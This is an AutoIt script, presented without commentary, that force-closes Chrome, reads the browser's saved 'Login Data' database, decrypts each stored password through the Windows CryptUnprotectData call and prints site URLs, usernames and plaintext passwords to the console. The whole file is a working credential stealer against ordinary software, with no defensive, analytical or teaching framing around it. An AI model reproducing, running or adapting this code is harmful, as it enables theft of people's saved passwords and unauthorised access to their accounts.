#include <SQLite.au3>
#include <WinAPI.au3>

#Region ChromeUncrypt
Global Const $tagDATA_BLOB = "DWORD cbData;ptr pbData;"
Global Const $tagCRYPTPROTECT_PROMPTSTRUCT = "DWORD cbSize;DWORD dwPromptFlags;HWND hwndApp;ptr szPrompt;"
Global $hDLL_CryptProtect = DllOpen("crypt32.dll")

Func _CryptUnprotectData($bData, ByRef $sDesc, $sPwd = "", $iFlag = 0, $pPrompt = 0)
	Local $aRet, $iError, $tEntropy, $pEntropy = 0
	Local $tDataIn = _DataToBlob($bData)
	$sDesc = ""

	If $sPwd <> "" Then
		$tEntropy = _DataToBlob($sPwd)
		$pEntropy = DllStructGetPtr($tEntropy)
	EndIf

	Local $tDataBuf = DllStructCreate($tagDATA_BLOB)
	Local $tDesc = DllStructCreate("ptr desc")
	Local $pDesc = DllStructGetPtr($tDesc)

	$aRet = DllCall($hDLL_CryptProtect, "BOOL", "CryptUnprotectData", "struct*", $tDataIn, "ptr*", $pDesc, "ptr", $pEntropy, "ptr", 0, "ptr", $pPrompt, "DWORD", $iFlag, "struct*", $tDataBuf)
	$iError = @error

	_WinAPI_LocalFree(DllStructGetData($tDataIn, "pbData"))

	If $sPwd <> "" Then _WinAPI_LocalFree(DllStructGetData($tEntropy, "pbData"))
	If $iError Then Return SetError(1, 0, "")
	If $aRet[0] = 0 Then Return SetError(2, _WinAPI_GetLastError(), "")

	Local $tDataOut = DllStructCreate("char data[" & DllStructGetData($tDataBuf, "cbData") & "]", DllStructGetData($tDataBuf, "pbData"))
	Local $sData = DllStructGetData($tDataOut, "data")

	Local $aLen = DllCall("msvcrt.dll", "UINT:cdecl", "wcslen", "ptr", $aRet[2])
	Local $tDesc = DllStructCreate("wchar desc[" & $aLen[0] + 1 & "]", $aRet[2])
	$sDesc = DllStructGetData($tDesc, "desc")

	_WinAPI_LocalFree($aRet[2])
	_WinAPI_LocalFree(DllStructGetData($tDataBuf, "pbData"))

	Return $sData
EndFunc   ;==>_CryptUnprotectData

Func _DataToBlob($data)
	Local $iLen, $tDataIn, $tData, $aMem
	Local Const $LMEM_ZEROINIT = 0x40
	Select
		Case IsString($data)
			$iLen = StringLen($data)
		Case IsBinary($data)
			$iLen = BinaryLen($data)
		Case Else
			Return SetError(1, 0, 0)
	EndSelect

	$tDataIn = DllStructCreate($tagDATA_BLOB)
	$aMem = DllCall("Kernel32.dll", "handle", "LocalAlloc", "UINT", $LMEM_ZEROINIT, "UINT", $iLen)
	$tData = DllStructCreate("byte[" & $iLen & "]", $aMem[0])

	DllStructSetData($tData, 1, $data)
	DllStructSetData($tDataIn, "cbData", $iLen)
	DllStructSetData($tDataIn, "pbData", DllStructGetPtr($tData))

	Return $tDataIn
EndFunc   ;==>_DataToBlob
#EndRegion ChromeUncrypt


Func _chrome()
	$dllname = 'sqlite3.dll'
	If @AutoItX64 Then
		$dllname = 'sqlite3_x64.dll'
	EndIf

	If FileExists(@ScriptDir & '\' & $dllname) Then
		Sleep(200)
	EndIf

	$pwdfile = @UserProfileDir & "\AppData\Local\Google\Chrome\User Data\Default\"
	$chk = FileExists($pwdfile)
	If $chk == 0 Then
		Return
	ElseIf $chk == 1 Then
		$pwdfile = $pwdfile & "Login Data"
	EndIf
	Local $sSQliteDll
	ProcessClose('chrome.exe')
	Sleep(2000)
	$sSQliteDll = _SQLite_Startup(@ScriptDir & '\' & $dllname)
	$dbn = _SQLite_Open($pwdfile)
	Local $query, $row
	_SQLite_Query($dbn, "SELECT action_url, username_value, password_value FROM logins", $query)
	If @error Then Return

	$npwdfile = @DesktopDir&"output.txt"
	While _SQLite_FetchData($query, $row) = $SQLITE_OK
		$url = $row[0]
		$usrname = $row[1]
		Local $x = ''
		$pwd = _CryptUnprotectData($row[2], $x)
		If $usrname == "" And $pwd = 0 Then
		Else
			ConsoleWrite('[+] ' & $url & @LF & '    [%] Username : ' & $usrname & @LF & '    [%] Password : ' & $pwd & @LF)
		EndIf
	WEnd
EndFunc

_chrome()
